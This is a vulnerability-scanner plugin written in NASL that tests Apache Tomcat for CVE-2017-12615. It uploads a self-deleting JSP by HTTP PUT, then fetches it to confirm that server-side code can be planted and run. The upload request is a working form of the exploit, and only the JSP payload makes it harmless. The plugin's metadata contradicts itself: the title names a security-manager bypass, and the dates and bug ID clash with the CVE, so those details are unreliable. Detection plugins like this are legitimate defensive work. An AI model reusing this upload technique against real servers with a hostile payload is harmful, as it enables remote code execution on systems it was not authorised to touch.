
include("compat.inc");
tag_summary = "Apache Tomcat Security Manager Bypass";

tag_solution = "Updates are available. Please see the references for more information.";

CPE = "cpe:/a:apache:tomcat";


if (description)
{
 script_id(51799156);
 script_version("$Revision: 13 $");
 script_set_attribute(attribute:"last_modification", value:"$Date: 2016-02-22 11:23:30 +0000 (Mon, 22 Feb 2016) $");
 script_set_attribute(attribute:"creation_date", value:"2016-04-05 22:37:48 +0000 (Tue, 05 Apr 2016)");
 script_bugtraq_id(16145);
 script_cve_id("CVE-2017-12615");
 script_set_attribute(attribute:"risk_factor", value:"High");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
 script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
 script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:X");

 script_name(english:"Apache Tomcat Security Manager Bypass");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_set_attribute(attribute:"solution", value:"Upgrade Apache Tomcat version: https://tomcat.apache.org/");

 script_set_attribute(attribute:"description", value:desc);
 script_summary("Determine if installed Tomcat version is vulnerable");
 script_category(ACT_GATHER_INFO);
 script_family("Web Servers");
 script_dependencies("http_methods.nasl");
 script_require_ports("Services/www", 8080,80);
 script_require_keys("www/put_upload", "www/delete_upload");
 script_copyright(english:"This script is Copyright (C) 2017 WebRAY, Inc.");
 script_set_attribute(attribute : "solution" , value : tag_solution);
 script_set_attribute(attribute : "summary" , value : tag_summary);
 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");

port1= get_kb_item("Services/www");

if(port1)
{
	port = port1;
}
else
{
	port = 8080;
}

if(!get_port_state(port)){
  exit(0);
}
rand = rand_str(length:8, charset:"0123456789abcdef");

url = string("/"+rand+".jsp/");
data = '<%out.println("-----Tomcat arbitrary file upload vulnerability_cve-2017-12615_test-----");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>';
req = http_send_recv3(method: "PUT", port: port, item: url, data: data, fetch404: TRUE);
res = http_last_sent_request();
if(('HTTP/1.1 201'><req[0])||('HTTP/1.1 204'><req[0])){
    urls = string("/"+rand+".jsp");
    asreq = http_send_recv3(method: "GET", port: port, item: urls);
	if("vulnerability_cve-2017-12615_test">< asreq[2] && "HTTP/1.1 200" >< asreq[0]){
		    security_hole(port:port,extra:res+"             "+http_last_sent_request()+asreq[2]); 
			exit(0);
    }       
}

exit(0);


